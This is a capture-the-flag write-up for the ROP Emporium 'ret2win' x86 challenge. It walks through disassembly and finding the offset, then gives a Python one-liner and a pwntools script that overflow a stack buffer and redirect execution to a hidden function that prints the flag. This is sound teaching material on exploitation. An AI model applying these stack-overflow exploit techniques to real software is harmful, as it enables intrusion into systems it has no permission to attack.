# ROP Emporium - ret2win

Write up for the **ret2win** challenge from **ROP Emporium**, x86 version.

* [Challenge Information](#challenge-information)
* [Binary Analysis](#binary-analysis)
* [Capture The Flag](#capture-the-flag)

## Challenge Information

**Challenge link:** [https://ropemporium.com/challenge/ret2win.html](https://ropemporium.com/challenge/ret2win.html)

```text
Locate a method that you want to call within the binary.

Call it by overwriting a saved return address on the stack.
```

## Binary Analysis

```bash
$ ls
flag.txt  ret2win32

$ file ret2win32
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped

$ checksec --file=ret2win32
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Since the binary is **not stripped**, we can identify the available symbols:

```bash
$ rabin2 -s ret2win32 | grep "FUNC"
28  0x00000490 0x08048490 LOCAL  FUNC   0        deregister_tm_clones
29  0x000004d0 0x080484d0 LOCAL  FUNC   0        register_tm_clones
30  0x00000510 0x08048510 LOCAL  FUNC   0        __do_global_dtors_aux
33  0x00000540 0x08048540 LOCAL  FUNC   0        frame_dummy
36  0x000005ad 0x080485ad LOCAL  FUNC   127      pwnme
37  0x0000062c 0x0804862c LOCAL  FUNC   41       ret2win
46  0x000006c0 0x080486c0 GLOBAL FUNC   2        __libc_csu_fini
48  0x00000480 0x08048480 GLOBAL FUNC   4        __x86.get_pc_thunk.bx
52  0x000006c4 0x080486c4 GLOBAL FUNC   0        _fini
60  0x00000660 0x08048660 GLOBAL FUNC   93       __libc_csu_init
64  0x00000470 0x08048470 GLOBAL FUNC   2        _dl_relocate_static_pie
65  0x00000430 0x08048430 GLOBAL FUNC   0        _start
69  0x00000546 0x08048546 GLOBAL FUNC   103      main
71  0x00000374 0x08048374 GLOBAL FUNC   0        _init
1   0x000003b0 0x080483b0 GLOBAL FUNC   16       imp.read
2   0x000003c0 0x080483c0 GLOBAL FUNC   16       imp.printf
3   0x000003d0 0x080483d0 GLOBAL FUNC   16       imp.puts
4   0x000003e0 0x080483e0 GLOBAL FUNC   16       imp.system
6   0x000003f0 0x080483f0 GLOBAL FUNC   16       imp.__libc_start_main
7   0x00000400 0x08048400 GLOBAL FUNC   16       imp.setvbuf
8   0x00000410 0x08048410 GLOBAL FUNC   16       imp.memset
```

Among them we identify `main`, `pwnme`, and `ret2win`.

Because the binary is **NO PIE**, function addresses are static and do not change at runtime.

Therefore, we note the memory addresses of the relevant functions:

```bash
$ readelf -s ret2win32 | grep -E "(main|pwnme|ret2win)$"
    36: 080485ad   127 FUNC    LOCAL  DEFAULT   14 pwnme
    37: 0804862c    41 FUNC    LOCAL  DEFAULT   14 ret2win
    69: 08048546   103 FUNC    GLOBAL DEFAULT   14 main
```

So:

* `main`: 0x8048546
* `pwnme`: 0x80485ad
* `ret2win`: 0x804862c

To understand how the program works, we decompile it using **Ghidra** before running it.

Decompiled code analysis of the `main` function:

```c
undefined4 main(void) {
  setvbuf(stdout,(char *)0x0,2,0);
  puts("ret2win by ROP Emporium");
  puts("x86\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

The *main* function calls `pwnme`.

Decompiled code analysis of the `pwnme` function:

```c
void pwnme(void) {
  undefined1 buf [40];
  
  memset(buf,0,32);
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
  printf("> ");
  read(0,buf,56);
  puts("Thank you!");
  return;
}
```

The *pwnme* function defines a stack variable *buf* of 40 elements. It then zeroes the first 32 bytes using `memset`, prints various messages to STDOUT, and calls `read` to read 56 bytes into *buf*.

The vulnerability lies in the *read* function, which allows writing more data onto the stack than *buf* can hold.

\[+] `pwnme`: **Buffer overflow vulnerability**.

It is possible to write exactly `56-40 = 16` extra bytes on the stack.

Decompiled code analysis of the `ret2win` function:

```c
void ret2win(void) {
  puts("Well done! Here's your flag:");
  system("/bin/cat flag.txt");
  return;
}
```

This function prints the contents of `flag.txt`, but it is not called anywhere in the program.

\[+] `ret2win`: **File Content Disclosure vulnerability**.

The idea is to exploit the buffer overflow vulnerability to overwrite the saved EIP in the *pwnme* stack frame with the address of `ret2win`.

This way, we alter the program's behavior to reveal `flag.txt`.

Before building an exploit, we verify that `read` can indeed overwrite the return address.

Disassembled code analysis of the `pwnme` function:

```bash
$ objdump --disassemble=pwnme -M intel ret2win32 

080485ad <pwnme>:
 80485ad:       55                      push   ebp
 80485ae:       89 e5                   mov    ebp,esp
 80485b0:       83 ec 28                sub    esp,0x28
 80485b3:       83 ec 04                sub    esp,0x4
 80485b6:       6a 20                   push   0x20
 80485b8:       6a 00                   push   0x0
 80485ba:       8d 45 d8                lea    eax,[ebp-0x28]
 80485bd:       50                      push   eax
 80485be:       e8 4d fe ff ff          call   8048410 <memset@plt>
 80485c3:       83 c4 10                add    esp,0x10
 80485c6:       83 ec 0c                sub    esp,0xc
 80485c9:       68 08 87 04 08          push   0x8048708
 80485ce:       e8 fd fd ff ff          call   80483d0 <puts@plt>
 80485d3:       83 c4 10                add    esp,0x10
 80485d6:       83 ec 0c                sub    esp,0xc
 80485d9:       68 68 87 04 08          push   0x8048768
 80485de:       e8 ed fd ff ff          call   80483d0 <puts@plt>
 80485e3:       83 c4 10                add    esp,0x10
 80485e6:       83 ec 0c                sub    esp,0xc
 80485e9:       68 88 87 04 08          push   0x8048788
 80485ee:       e8 dd fd ff ff          call   80483d0 <puts@plt>
 80485f3:       83 c4 10                add    esp,0x10
 80485f6:       83 ec 0c                sub    esp,0xc
 80485f9:       68 e8 87 04 08          push   0x80487e8
 80485fe:       e8 bd fd ff ff          call   80483c0 <printf@plt>
 8048603:       83 c4 10                add    esp,0x10
 8048606:       83 ec 04                sub    esp,0x4
 8048609:       6a 38                   push   0x38
 804860b:       8d 45 d8                lea    eax,[ebp-0x28]
 804860e:       50                      push   eax
 804860f:       6a 00                   push   0x0
 8048611:       e8 9a fd ff ff          call   80483b0 <read@plt>
 8048616:       83 c4 10                add    esp,0x10
 8048619:       83 ec 0c                sub    esp,0xc
 804861c:       68 eb 87 04 08          push   0x80487eb
 8048621:       e8 aa fd ff ff          call   80483d0 <puts@plt>
 8048626:       83 c4 10                add    esp,0x10
 8048629:       90                      nop
 804862a:       c9                      leave  
 804862b:       c3                      ret  
```

The *buf* is stored at `ebp-0x28`, so:

* Distance from *buf* to *saved ebp*: 40 bytes
* Distance from *saved ebp* to *saved eip*: 4 bytes (per **x86 calling convention**)

Thus, the offset from *buf* to *saved eip* is 44 bytes (within the 56-byte read!).

We confirm this using **GDB**.

```bash
$ gdb-pwndbg

pwndbg> file ret2win32

pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

pwndbg> run
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Thank you!

Program received signal SIGSEGV, Segmentation fault.
 EAX  0xb
 EBX  0xf7fa3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 ECX  0xf7fa49b4 (_IO_stdfile_1_lock) ◂— 0
 EDX  1
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd0f4 —▸ 0xffffd2db ◂— '/home/ap/Desktop/rop_emporium/ret2win/x86/ret2win32'
 EBP  0x6161616b ('kaaa')
 ESP  0xffffd020 ◂— 0x6161616d ('maaa')
 EIP  0x6161616c ('laaa')

pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

## Capture The Flag

The attack plan is to build a `payload` that overwrites the *saved eip* of *pwnme*:

* **PADDING** of 44 bytes
* **ret2win ADDRESS** of 4 bytes

This should allow us to invoke the `ret2win` function.

```bash
$ python3
>>> padding = b"A"*44
>>> ret2win_addr = b"\x2c\x86\x04\x08" # little-endian 0x0804862c
>>> import sys
>>> sys.stdout.buffer.write(padding + ret2win_addr) # payload
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,
```

Pass the *payload* as input to the program:

```bash
$ python3 -c 'padding = b"A"*44; ret2win_addr = b"\x2c\x86\x04\x08"; import sys; sys.stdout.buffer.write(padding + ret2win_addr)' | ./ret2win32
...
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
```

It works!

Below is a *Python* script using the *pwntools* library to generate the *payload* and interact with the vulnerable program.

```python
from pwn import context, ELF, process, flat

exe = './ret2win32'

elf = context.binary = ELF(exe, checksec=False)

context.log_level = 'debug'

# Payload crafting

srip_offset = 44 # bytes

ret2win_addr = 0x0804862c

payload = flat({
    srip_offset: ret2win_addr
    })

# Get the flag

io = process([exe])

io.sendline(payload)

data = io.recvall().decode()

data = data.split('Thank you!')

print(data[1])
```

```bash
$ python3 exploit.py
...
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

The resolution procedure for `ret2win` on the **x86-64** architecture is very similar.

---
